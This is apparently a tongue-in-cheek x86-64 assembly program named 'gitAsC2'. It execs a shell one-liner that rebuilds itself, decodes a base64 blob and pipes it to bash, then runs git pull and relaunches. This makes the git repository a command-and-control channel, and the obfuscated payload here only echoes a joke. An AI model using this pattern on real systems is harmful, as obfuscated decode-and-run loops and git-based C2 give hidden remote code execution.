section .text 
  global 🤯 ; turns out you can replace _start with whatever you want
🤯:
  mov rax, 1 ; syscall for write 
  mov rdi, 1 ; specify standard out
  mov rsi, 🍆 ; move the contents of the string to rsi
  mov rdx, 12
  syscall ; run the syscall constructed above
  mov rax, 59 ; syscall for exec https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/exec.c
  lea rdi, [rel 🤮] ; specify /bin/sh as interpriter, "look at me being all fancy and posix complient, even if /bin/sh is just symlinked to bash on most distros"
  lea rsi, [rel 🤗] ; loads in rest of commands to be run in the shell defined above
  xor edx, edx ; 0 out edx by xoring it with itself
  syscall ; run the syscall constructed above
; data stored below, unless its over 50lbs, if its over 50 it cant be a caryon
🍆  db 'No Mr. Bond,'
🤗  dq 🤮, 😀, 😃, 😄,0 ; command to be run, this is one gnarly one liner
🤮  db '/bin/sh',0 ; interpriter
😀  db '-c',0 ; specifyes bash is to exicute the one line
😃  db '~/gitAsC2/nasm/nasm' ; location of asembler, usefull for any and all self asemble
😄  db ' -f elf64 -o ~/gitAsC2/main.o ~/gitAsC2/main.asm 2>/dev/null && ld -o ~/gitAsC2/main ~/gitAsC2/main.o 2>/dev/null && cd ~/gitAsC2/ && echo cHl0aG9uIC1jICJwcmludChjaHIoMTAxKStjaHIoOTkpK2NocigxMDQpK2NocigxMTEpK2NocigzMikrY2hyKDM0KStjaHIoMzIpK2Nocig3MykrY2hyKDMyKStjaHIoNjkpK2NocigxMjApK2NocigxMDEpK2Nocig5OSkrY2hyKDMyKStjaHIoODkpK2NocigxMTEpK2NocigxMTcpK2NocigzMikrY2hyKDExNikrY2hyKDExMSkrY2hyKDMyKStjaHIoNjgpK2NocigxMDUpK2NocigxMDEpK2NocigzNCkpIiB8IGJhc2ggLQ== | base64 --decode | bash - && git pull >/dev/null && echo "hello, you are currently reviewing my code, i hope you like it, im so lonley" && ~/gitAsC2/main', 0 ; a monstrosoty made of bash and python the likes of witch are seldom seen
